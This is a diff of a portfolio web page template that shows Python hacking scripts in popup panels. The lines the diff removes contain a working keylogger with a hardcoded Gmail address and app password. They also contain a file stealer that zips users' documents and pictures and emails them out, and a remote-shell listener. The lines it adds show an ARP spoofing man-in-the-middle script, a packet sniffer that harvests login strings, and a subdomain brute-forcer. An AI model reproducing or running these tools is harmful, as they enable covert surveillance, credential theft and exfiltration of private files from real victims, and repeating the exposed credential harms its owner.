@@ -29,6 +29,10 @@
   <link href="{% static 'jake_portfolio/assets/css/style.css' %}" rel="stylesheet">
   <link href="{% static 'jake_portfolio/assets/css/portfolio.css' %}" rel="stylesheet">
 
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+
+
   <!-- =======================================================
   * Template Name: Personal
   * Updated: Jul 27 2023 with Bootstrap v5.3.1
@@ -470,92 +474,135 @@ handling skills. Willing to be trained and eager to learn.</em></p>
         <center><h4>Visit the website here: <a href="https://carzone-p58h.onrender.com">carzone-p58h.onrender.com</a></h4></center>
     </div>
 
+    <div class="col-lg-12 col-md-12 portfolio-item filter-game_dev">
+    </div>
+
+
     <div class="col-lg-12 col-md-12 portfolio-item filter-others">
-      <!DOCTYPE html>
+        <style>
+          .popup-body {
+            font-family: Arial, sans-serif;
+          }
+
+          /* Styles for the popup overlay */
+
+          @media (max-width: 500px) {
+              .popup-overlay .popup-content {
+                  width: 50%;
+                }
+              }
+
+          .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+
+          }
 
 
-<title>Python Scripts</title>
-<style>
-  .popup-body {
-    font-family: Arial, sans-serif;
-    align-items: center;
-  }
+          /* Styles for the popup content */
+          .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #091408;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            color: #ffffff;
 
-  /* Styles for the popup overlay */
-  .popup-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    z-index: 1000;
-  }
+            /* Add these styles for scrolling */
+            max-height: 80%; /* Set a maximum height */
+            overflow: auto; /* Enable scrolling when content exceeds max-height */
+          }
 
-  /* Styles for the popup content */
-  .popup-content {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background-color: #232b28;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-    z-index: 1001;
-    color: #ffffff;
+          /* Close button style */
+          .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+          }
 
-    /* Add these styles for scrolling */
-    max-height: 80%; /* Set a maximum height */
-    overflow: auto; /* Enable scrolling when content exceeds max-height */
-  }
+          .green-underline-button {
+            font-family: 'PT Mono', monospace;
+            display: inline-block;
+            padding: 5px 10px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid #00a859;
+            border-left: 2px solid #00a859;
+            border-right: 2px solid #00a859;
+            cursor: pointer;
+            transition: border-color 0.3s;
+          }
 
-  /* Close button style */
-  .close-button {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    cursor: pointer;
-  }
+          .green-underline-button:hover {
+            border-color: #006b3e;
+            border-bottom: 0px;
+            color: #38eb5d
+          }
 
-  .green-underline-button {
-    display: inline-block;
-    padding: 5px 10px;
-    font-size: 16px;
-    color: #ffffff;
-    background-color: transparent;
-    border: none;
-    border-bottom: 2px solid #00a859;
-    cursor: pointer;
-    transition: border-color 0.3s;
-  }
+          .green-underline-button.right-scr {
+            border-left: 0px;
+          }
 
-  .green-underline-button:hover {
-    border-color: #006b3e;
-    border-bottom: 0px;
-    color: #38eb5d
-  }
+          .green-underline-button.left-scr {
+            border-right: 0px;
+          }
 
-  #iframe1 {
-  display: block;
-  border: none;
-}
+          #iframe1 {
+          display: block;
+          border: none;
+        }
 
-  .hover-iframe {
-    display: none;
-    border: none;
-  }
-</style>
+          .hover-iframe {
+            display: none;
+            border: none;
+          }
 
-<div class="popup-body">
-  <h1>Python Scripts</h1>
+          #python {
+            color: #18d26e;
+            font-family: 'PT Mono', monospace;
+          }
+
+          h3 {
+            display: inline;
+          }
+
+          pre {
+            font-family: 'PT Mono', monospace;
+            color: #f7f5f0;
+          }
+
+
+
+        </style>
+
+<center>
+  <h3 id="python">Python</h3><h3> Scripts</h3></br></br></br>
+
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe1" data-popup-id="popup1">MAC Address Changer (Linux)</button>
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe2" data-popup-id="popup2">Network Scanner</button>
-  <button class="openPopupButton green-underline-button" data-popup-id="popup3">Keylogger (via email report)</button>
-  <button class="openPopupButton green-underline-button" data-popup-id="popup4">File Getter/Stealer</button>
-  <button class="openPopupButton green-underline-button" data-popup-id="popup5">Listener</button>
-  <button class="openPopupButton green-underline-button" data-popup-id="popup6">Backdoor</button></br></br>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe3" data-popup-id="popup3">ARP Spoofer (MITM Attack)</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe4" data-popup-id="popup4">Packet Sniffer (While MITM)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe5" data-popup-id="popup5">Website Crawler</button>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe6" data-popup-id="popup6">Port Listener</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe6" data-popup-id="popup6">Remote Backdoor</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe7" data-popup-id="popup7">Keylogger (via email report)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe8" data-popup-id="popup8">File Getter/Stealer</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe9" data-popup-id="popup9">Vulnerability Scanner</button></br></br>
+</center>
+
 
   <!-- Popup overlay -->
 
@@ -565,6 +612,10 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     <div class="popup-content">
       <span class="close-button" data-popup-id="popup1">&times;</span>
       <pre id="popup1Content">
+
+              <--------------------------------- MAC CHANGER ------------------------------------>
+
+
         #!/usr/bin/env python
 
         import subprocess
@@ -621,6 +672,10 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     <div class="popup-content">
       <span class="close-button" data-popup-id="popup2">&times;</span>
       <pre id="popup2Content">
+
+        <--------------------------------- NETWORK SCANNER ------------------------------------>
+
+
         #!usr/bin/python/env
 
         import scapy.all as scapy
@@ -657,9 +712,6 @@ handling skills. Willing to be trained and eager to learn.</em></p>
             for client in result_list:
                 print(client["IP"]+"\t\t"+client["MAC Address"])
 
-
-
-
         target_client = get_arguments()
         scan_result = scan(target_client.target)
         print_result(scan_result)
@@ -671,70 +723,59 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     <div class="popup-content">
       <span class="close-button" data-popup-id="popup3">&times;</span>
       <pre id="popup2Content">
-      #!usr/bin/env python3
-      import pynput.keyboard
-      import smtplib, threading
-      import sys
 
-      class KeyLogger:
-
-          def __init__(self, time_interval, email, password):
-              self.log = "Keylogger Started, sending report every " + str(time_interval/60) + " minutes."
-              self.interval = time_interval
-              self.email = email
-              self.password = password
-
-          def append_log(self, string):
-              self.log = self.log + string
-              if "143" in self.log:
-                  self.stop()
-
-          def keylog(self, key):
-
-              try:
-                  current_key = str(key.char)
-                  print(current_key)
-
-              except AttributeError:
-
-                  if key == key.space:
-                      current_key = " "
-                  else:
-                      current_key = " " + str(key) + " "
-              self.append_log(current_key)
-
-          def send_mail(self, email, password, message):
-              server = smtplib.SMTP("smtp.gmail.com", 587)
-              server.starttls()
-              server.login(email, password)
-              server.sendmail(email, email, message)
-
-          def report(self):
-              print(self.log)
-              self.send_mail(self.email, self.password, self.log)
-              if "143" not in self.log:
-                  self.log = ""
-                  timer = threading.Timer(self.interval, self.report)
-                  timer.start()
-              else:
-                  quit(self.report)
-
-          def stop(self):
-              self.send_mail(self.email, self.password, "[!] Reporting Terminated.")
-              print("[!] Reporting Terminated.")
-              exit(KeyLogger)
+        <--------------------------------- ARP SPOOFER ------------------------------------>
 
 
+        #!usr/bin/python/env
+        import sys
+        import scapy.all as scapy
+        import scapy.layers.l2 as scapyA
+        import optparse
+        import time
+        import os
 
-          def start(self):
-              keyboard_listener = pynput.keyboard.Listener(on_press=self.keylog)
-              with keyboard_listener:
-                  self.report()
-                  keyboard_listener.join()
+        def spoof(target_IP, spoof_IP):
+            target_mac = get_mac((target_IP))
+            packet = scapyA.ARP(op=2, pdst=target_IP, hwdst=target_mac, psrc=spoof_IP)
+            print(target_mac+"\n")
+            scapy.send(packet, verbose=False)
+
+        def restore(dest_IP, source_IP):
+            dest_MAC = get_mac((dest_IP))
+            source_MAC = get_mac(source_IP)
+            packet = scapyA.ARP(op=2, pdst=dest_IP, hwdst=dest_MAC, psrc=source_IP, hwsrc=source_MAC)
+            scapy.send(packet, count=4, verbose=False)
 
 
-      my_keylogger = KeyLogger(10,"zipyeg222@gmail.com", "wpnyatiifazxotyo")
-      my_keylogger.start()
+        def get_mac(target_IP):
+            arp_req = scapyA.ARP(pdst=target_IP)
+            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_broadcast_req = broadcast/arp_req
+            answer = scapyA.srp(arp_broadcast_req, timeout=1, verbose=False)[0]
+
+            for e in answer:
+                  mac = e[1].hwsrc
+                  return mac
+
+        target_IP = "192.168.46.129"
+        gateway_IP = "192.168.46.2"
+
+        sent_packets = 0
+        try:
+            while True:
+                spoof(target_IP, gateway_IP)
+                spoof(gateway_IP, target_IP)
+                sent_packets = sent_packets + 2
+                print("\r[+] Packets sent: " + str(sent_packets), end="")
+                sys.stdout.flush()
+                time.sleep(2)
+        except KeyboardInterrupt:
+            print("\n Ctrl + C pressed, Resetting ARP Table, please wait...")
+            restore(target_IP, gateway_IP)
+            restore(gateway_IP, target_IP)
+
+
       </pre>
     </div>
   </div>
@@ -743,256 +784,40 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     <div class="popup-content">
       <span class="close-button" data-popup-id="popup4">&times;</span>
       <pre id="popup2Content">
-        # -*- coding: utf-8 -*-
-    """
-    Created on Mon May 22 15:12:34 2023
 
-    @author: yego21
-    """
-    import subprocess
-    import os
-    import smtplib
-    import re
-    import tempfile
-    import sys
-    from email.mime.text import MIMEText
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.base import MIMEBase
-    from email import encoders
+        <--------------------------------- PACKET SNIFFER ------------------------------------>
 
 
-    class Getter:
+        #! usr/bin/env python
+        import scapy.all as scapy
+        from scapy.layers import http
+        import scapy.utils as scapyU
 
+        def sniff(interface):
+            scapy.sniff(iface=interface, store=False, prn=sniff_packet)
 
-        def __init__(self):
-            self.get_dirs()
-            self.set_mime_parameter()
-            self.doc_file_types = ["doc", "docm", "docx", "txt", "dotx", "eml", "pdf", "ppt", "pptx", "rtf"]
-            self.graphic_file_types = ["jpg", "jpeg", "psd", "png", "heic", "raw" ]
-            self.get_sys_info()
-            self.temp_dir = tempfile.gettempdir()
+        def get_url(packet):
+            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+            return url
 
+        def get_login_info(packet):
+            if packet.haslayer(scapy.Raw):
+                keywords = ["User", "Username", "Password", "Login", "login", "un", "pass"]
+                load = str(packet[scapy.Raw].load)
+                for keyword in keywords:
+                    if keyword in load:
+                        return load
 
-        def get_other_drives(self):
-            drive_result = subprocess.check_output("wmic logicaldisk get deviceid, description", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            # print(drive_result.decode())
-            drive_list = re.findall("(?:Local Fixed Disk\s*)(.):", drive_result.decode())
-            drive_list.remove("C")
-            # drive_list.remove("D")
-            # drive_list.remove("E")
-            # drive_list.remove("F")
-            # drive_list.remove("G")
-            return drive_list
+        def sniff_packet(packet):
 
+            if packet.haslayer(http.HTTPRequest):
+                url = get_url(packet)
+                login_info = get_login_info(packet)
+                print("[+] HTTP Request >>" + str(url))
+                print("Possible Login Information: " + str(login_info))
 
-        def set_mime_parameter(self):
-            self.msg = MIMEMultipart()
-            self.msg['Subject'] = "Email from: " + self.uid
-            self.msg['From'] = self.uid
-            self.msg['To'] = ""
+        sniff("eth0")
 
-
-        def send_mail(self, email, password, message):
-            self.server = smtplib.SMTP("smtp.gmail.com", 587)
-            self.server.starttls()
-            self.server.login(email, password)
-            self.server.sendmail(email, email, message)
-
-
-        def mime_obj(self, content, file_name):
-            file = MIMEBase('application', 'octet-stream')
-            file.set_payload(content.read())
-            encoders.encode_base64(file)
-            file.add_header('Content-Disposition', "attachment; filename = " + file_name )
-            self.msg.attach(file)
-
-
-        def get_sys_info(self):
-            attach_info = ""
-            system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            ip_info = subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            attach_info = system_info.decode() + ip_info.decode()
-            self.msg.attach(MIMEText(attach_info, 'plain'))
-
-
-        def get_dirs(self):
-            self.uid = os.getlogin()
-
-            documents = "C:/Users/" + self.uid + "/Documents/"
-            downloads = "C:/Users/" + self.uid + "/Downloads/"
-            pictures = "C:/Users/" + self.uid + "/Pictures/"
-            D = "D:"
-            E = "E:"
-            F = "F:"
-            G = "G:"
-            H = "H:"
-            I = "I:"
-            path_dict = {"Documents":documents, "Downloads":downloads, "Pictures":pictures, "D":D, "E":E, "F":F, "G":G, "H":H, "I":I}
-
-            return path_dict
-
-
-        def check_files(self, file_directory):
-
-            os.chdir(self.get_dirs().get(file_directory))
-            check_all_files = subprocess.check_output("dir /s /b /o:gn", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-
-            # print(check_all_files.decode('cp1252'))
-            found_files = re.findall("(?:"+ file_directory +".)(.*\..*)", check_all_files.decode(errors = "ignore"))
-            # print(found_files)
-            return found_files
-
-
-
-        def check_file_size(self, file_path):
-            file_path = file_path.replace("/","\\")
-            result = subprocess.check_output('dir "' + file_path +'"', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            file_size = re.findall("(?:File\(s\)\s*)(.*)bytes", result.decode())
-            for size in file_size:
-                size = size.replace(",","")
-            return int(size)
-
-        def read_file(self, path):
-            try:
-                attachment = open (path, "rb")
-                return attachment
-            except PermissionError:
-                return None
-
-        def zip_and_email(self, my_file_string, file_name, dts, file_types):
-            try:
-                zip_name = file_types + "_from_" + dts + ".zip"
-                zip_path = self.temp_dir + "\\" + zip_name
-                # print(my_file_string)
-                # print(zip_path)
-                subprocess.call("tar -a -c -f " + zip_path +" "+ my_file_string, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-                file_data = self.read_file(zip_path)
-                # print(file_data)
-                # print("[~] Sending zip as email...Please wait.")
-                self.mime_obj(file_data, zip_name)
-                file_data = None
-                os.remove(zip_path)
-                try:
-                    # ---- ENTER THE EMAIL YOU WANT TO USE FOLLOWED BY THE APP PASSWORD ----
-                    self.send_mail("%YOUR_EMAIL_HERE%", "%YOUR_APP_PASSWORD%", self.msg.as_string())
-                    self.set_mime_parameter()
-                except Exception:
-                    self.set_mime_parameter()
-                    pass
-
-            except Exception:
-                # print(traceback.format_exc())
-                pass
-
-
-        def run(self):
-            dirs_to_scan = ["Documents", "Downloads", "Pictures"]
-            for drives in self.get_other_drives():
-                dirs_to_scan.append(str(drives))
-            # print(dirs_to_scan)
-
-            my_gfile_string = ""
-            my_file_string = ""
-            append_gzip_name = 0
-            append_zip_name = 0
-            for dts in dirs_to_scan:
-                full_file_path_result = self.check_files(dts)
-                gtotal_size = 0
-                total_size = 0
-                count = 0
-
-                for i in range(len(full_file_path_result)):
-                    count += 1
-                    file_length_count =  len(full_file_path_result)
-                    try:
-                        full_file_path_result[i] = full_file_path_result[i].replace("\r","")
-                        file_name = full_file_path_result[i].split("\\")[-1]
-
-                        ext = re.search("....\Z", file_name)
-
-                        for gtypes in self.graphic_file_types:
-                            if gtypes in ext.group():
-                                if gtypes != "jpg" or ext.group() != "jpeg":
-                                    data = self.get_dirs().get(dts)+full_file_path_result[i]
-                                    if gtotal_size < 15000000:
-                                            gcurrent_size = self.check_file_size(data)
-                                            gtotal_size = gtotal_size + gcurrent_size
-                                            if gtotal_size and gcurrent_size < 20000000:
-                                                my_gfile_string = my_gfile_string +'"' + data + '"' + " "
-                                                # print(data)
-                                                # print(gtotal_size)
-                                    else:
-                                        append_gzip_name = append_gzip_name + 1
-                                        self.zip_and_email(my_gfile_string, file_name, dts, "ImgFiles(" + str(append_gzip_name) + ")")
-
-                                        my_gfile_string = ""
-                                        gtotal_size = 0
-
-
-                        for dtypes in self.doc_file_types:
-                            if dtypes in ext.group() :
-                                if dtypes != "doc" or ext.group() != "docx":
-                                    data = self.get_dirs().get(dts)+full_file_path_result[i]
-
-                                    if total_size < 15000000:
-                                            current_size = self.check_file_size(data)
-                                            total_size = total_size + current_size
-
-                                            if total_size and current_size < 20000000:
-                                                my_file_string = my_file_string +'"' + data + '"' + " "
-                                                # print(data)
-                                    else:
-                                        append_zip_name = append_zip_name + 1
-                                        self.zip_and_email(my_file_string, file_name, dts, "DocFiles(" + str(append_gzip_name) + ")")
-
-                                        my_file_string = ""
-                                        total_size = 0
-
-                    except Exception:
-                        # print(traceback.format_exc())
-                        continue
-
-                    finally:
-                        try:
-                            if count == file_length_count:
-                                self.zip_and_email(my_gfile_string, file_name, dts, "ImgFiles(" + str(append_gzip_name) + ")")
-                                self.zip_and_email(my_file_string, file_name, dts, "DocFiles(" + str(append_gzip_name) + ")")
-                                my_gfile_string = ""
-                                gtotal_size = 0
-                                my_file_string = ""
-                                total_size = 0
-                                append_gzip_name = 0
-                                append_zip_name = 0
-                        except Exception:
-                            # print(traceback.format_exc())
-                            my_gfile_string = ""
-                            gtotal_size = 0
-                            my_file_string = ""
-                            total_size = 0
-                            append_gzip_name = 0
-                            append_zip_name = 0
-                            continue
-
-
-            self.server.quit()
-            sys.exit()
-            # print("DONE")
-
-
-
-    # --- UNCOMMENT THE LINES BELOW IF YOU WANT TO USE A FRONT FILE THAT WILL OPEN WHILE EXECUTING THIS SCRIPT AS EXECUTABLE (use command "--add-data" while repacking)----
-    # front_file = sys._MEIPASS + %FILE_NAME_HERE%
-    # subprocess.Popen(front_file, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-
-
-
-
-    try:
-        my_get = Getter()
-        my_get.run()
-
-    except Exception:
-        sys.exit()
 
 
 
@@ -1004,92 +829,62 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     <div class="popup-content">
       <span class="close-button" data-popup-id="popup5">&times;</span>
       <pre id="popup2Content">
-        #!usr/bin/env python3
-        import json
-        import socket
-        import base64
+
+        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
 
 
-        class Listener:
-            def __init__(self, ip, port):
-                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                listener.bind((ip, port))
+        #!usr/bin/python/env
+        import requests, urllib.parse, re
 
-                listener.listen(0)
-                print("Listening to any port 4444")
-                self.connection, address = listener.accept()
-                print("Connection Established")
+        def get_response(url):
+            try:
+                req = requests.get(url)
+                if req.status_code == requests.codes.ok:
+                    print(requests.get(url))
+                    return req
+            except requests.exceptions.ConnectionError:
+                pass
 
+        url = "hackthissite.org"
+        with open ("subdomains.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + word + "." + url
+                result = get_response(test_url)
+                if result:
+                    print("[+] Discovered subdomain --> " + test_url)
 
-            def execute(self, command):
-                # self.connection.send(bytes(command.encode()))
-                self.reliable_send(command)
-                if command[0] == "exit":
-                    self.connection.close()
-                    exit()
+        dir_url = "192.168.46.128"
+        with open ("files-and-dirs.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + dir_url + "/" + word
+                # print(test_url)
+                result = get_response(test_url)
 
-                return self.reliable_recv()
-                # print("RECEIVED" + received_data)
-
-            def write_file(self, path, content):
-                with open(path, "wb") as new_file:
-                    new_file.write(base64.b64decode(content))
-                    print("[+] Download Successful.")
-
-            def read_file(self, path):
-                with open(path, "rb") as file:
-                    file_content = base64.b64encode(file.read())
-                    file_str = file_content.decode()
-                    return file_str
-
-
-            def reliable_send(self, data):
-                json_data = json.dumps(data)
-
-                self.connection.send(bytes(json_data.encode()))
-
-            def reliable_recv(self):
-
-                # json_data = self.connection.recv(1024)
-                # json_data = json_data.decode('utf-8')
-                # return json.loads(json_data)
-                json_data = b""
-                while True:
-                    try:
-                        json_data = json_data + self.connection.recv(1024)
-                        # print("JSOOONNNN" + json_data)
-                        # json_data = json_data.decode('utf-8')
-                        return json.loads(json_data)
-
-                    except ValueError:
-                        continue
+                if result:
+                    print("[+] Discovered subdirectory --> " + test_url)
 
 
-            def run(self):
-                while True:
-                    # dlcommand = input(">> ")
-                    command = input(">> ")
-                    command = command.split(" ")
-                    if command[0] == "ul":
-                        file_content = self.read_file(command[1])
-                        command.append(file_content)
-                    result = self.execute(command)
+        url = "https://carzone-p58h.onrender.com"
+        link_list = []
+        def get_href_links(url):
+            content = requests.get(url)
+            links = re.findall('(?:href=")(.*?)"', str(content.content))
+            return links
 
+        def crawl(url):
+            links = get_href_links(url)
+            for link in links:
+                link = urllib.parse.urljoin(url, link)
+                if "#" in link:
+                    link = link.split("#")[0]
+                if url in link and link not in link_list:
+                    link_list.append(link)
+                    print(link)
+                    crawl(link)
 
-                    # self.connection.send(dlcommand)
-                    # result = self.connection.recv(1024)
-                    if command[0] == "dl":
-                        self.write_file(command[1], result)
-
-
-
-                    else:
-                        print(result)
-
-
-        my_listener = Listener("192.168.1.160", 4444)
-        my_listener.run()
+        crawl(url)
 
       </pre>
     </div>
@@ -1147,11 +942,9 @@ handling skills. Willing to be trained and eager to learn.</em></p>
 
 
             def reliable_send(self, data):
-
                 json_data = json.dumps(data)
                 # json_data = json_data.decode('utf-8')
                 self.connection.send(bytes(json_data.encode()))
-
 
 
             def reliable_recv(self):
@@ -1214,11 +1007,12 @@ handling skills. Willing to be trained and eager to learn.</em></p>
       </pre>
     </div>
   </div>
-
-  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGDYU" width ="1000px" height="800px"></iframe>
-  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTigA" width ="1000px" height="800px"></iframe>
+<center>
+  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
+  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
 
 </div>
+</center>
 
 
 
